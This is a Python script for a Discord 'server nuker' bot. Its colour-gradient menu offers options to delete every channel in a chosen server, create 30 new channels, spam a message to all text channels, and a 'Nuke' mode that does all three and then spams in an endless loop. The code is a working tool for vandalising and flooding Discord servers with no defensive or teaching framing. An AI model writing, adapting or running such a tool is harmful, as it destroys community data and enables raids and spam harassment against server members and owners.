import discord
import asyncio
import os
from rich.console import Console
from rich.text import Text

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def interpolate_color(start, end, factor):
    """Interpolates between two RGB colors."""
    return tuple(int(start[i] + (end[i] - start[i]) * factor) for i in range(3))

def rgb_to_hex(rgb):
    """Converts an (R, G, B) tuple to a hex color string."""
    return f"#{rgb[0]:02x}{rgb[1]:02x}{rgb[2]:02x}"

def gradient_ascii(text, start_color=(128, 0, 128), end_color=(255, 255, 255)):
    lines = text.split("\n")
    gradient_text = Text()
    
    for i, line in enumerate(lines):
        factor = i / max(len(lines) - 1, 1)  
        color = rgb_to_hex(interpolate_color(start_color, end_color, factor))
        gradient_text.append(line + "\n", style=color)

    return gradient_text

MENU = """
                                         _   __      __
      ________  ______   _____  _____   / | / /_  __/ /_____  _____
     / ___/ _ \/ ___/ | / / _ \/ ___/  /  |/ / / / / //_/ _ \/ ___/
    (__  )  __/ /   | |/ /  __/ /     / /|  / /_/ / ,< /  __/ / 
   /____/\___/_/    |___/\___/_/     /_/ |_/\__,_/_/|_|\___/_/

                [ 1 ] Delete all channels
                [ 2 ] Make channels
                [ 3 ] Spam message
                [ 4 ] Nuke 
                [ 5 ] Exit

                Enter your option:
"""

console = Console()

async def delete_channels(bot, guild_id):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    print(f"Deleting all channels in: {guild.name}")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted: {channel.name}")
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

async def create_channels(bot, guild_id, channel_name):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    for i in range(30):  
        try:
            await guild.create_text_channel(f"{channel_name}-{i+1}")
            print(f"Created: {channel_name}-{i+1}")
        except Exception as e:
            print(f"Failed to create channel {channel_name}-{i+1}: {e}")

async def spam_message(bot, guild_id, message):
    guild = bot.get_guild(guild_id)
    if not guild:
        print("Bot is not in this server or invalid ID.")
        return
    
    tasks = []  

    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            tasks.append(channel.send(message))

    await asyncio.gather(*tasks)

    print(f"Successfully sent the message to all channels.")

async def nuke(bot, guild_id):
    channel_name = input("Enter the channel name for the new channels: ")
    message = input("Enter the message to spam: ")

    await delete_channels(bot, guild_id)  
    
    await create_channels(bot, guild_id, channel_name)
    
    while True: 
        await spam_message(bot, guild_id, message)

class MyBot(discord.Client):
    async def on_ready(self):
        clear_terminal()  
        console.print(gradient_ascii(MENU))

        while True:
            choice = input()
            if choice == "1":
                await delete_channels(self, guild_id)
            elif choice == "2":
                channel_name = input("Enter the name of the channels: ")
                await create_channels(self, guild_id, channel_name)
            elif choice == "3":
                message = input("What message do you want to send? ")
                await spam_message(self, guild_id, message)
            elif choice == "4":
                await nuke(self, guild_id)  
            elif choice == "5":
                exit() 
            else:
                print("Invalid input. Please choose again.")

bot_token = input("Enter your bot token: ")
guild_id = int(input("Enter your server ID: "))

intents = discord.Intents.default()
bot = MyBot(intents=intents)

bot.run(bot_token)
